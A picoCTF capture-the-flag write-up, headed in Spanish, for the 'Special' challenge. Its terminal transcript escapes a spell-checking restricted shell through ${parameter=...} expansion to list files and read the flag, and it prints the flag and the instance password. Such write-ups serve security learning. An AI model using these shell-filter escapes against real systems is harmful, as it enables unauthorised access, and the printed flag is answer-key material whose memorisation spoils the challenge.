# Retos picoCTF

# Level Special

## Objetivo
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
Start your instance to see connection details.
ssh -p 63899 ctf-player@saturn.picoctf.net
The password is d137d16e
## Solución
```
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -p 63899 ctf-player@saturn.picoctf.net

The authenticity of host '[saturn.picoctf.net]:63899 ([13.59.203.175]:63899)' can't be established.
ED25519 key fingerprint is SHA256:tJ0wuU5yBvNO/FrkHmR9iY36VJClMhKV+Hq2sxqKFmg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:63899' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Special$ ${parameter?ls}
${parameter?ls} 
sh: 1: parameter: ls
Special$ ${:ls}
${:ls} 
sh: 1: Bad substitution
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cd blargh} 

${parameter=cd blargh} 
Special$ Traceback (most recent call last):
  File "/usr/local/Special.py", line 19, in <module>
    elif cmd[0] == '/':
IndexError: string index out of range
Connection to saturn.picoctf.net closed.
                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -p 63899 ctf-player@saturn.picoctf.net

ctf-player@saturn.picoctf.net's password: 
Permission denied, please try again.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Dec  2 03:52:00 2024 from 127.0.0.1
Special$ ${parameter?ls}
${parameter?ls} 
sh: 1: parameter: ls
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ 

```
## Referencias
use el siguiente tutorial para completar el reto https://josephkimiri.github.io/posts/Special/

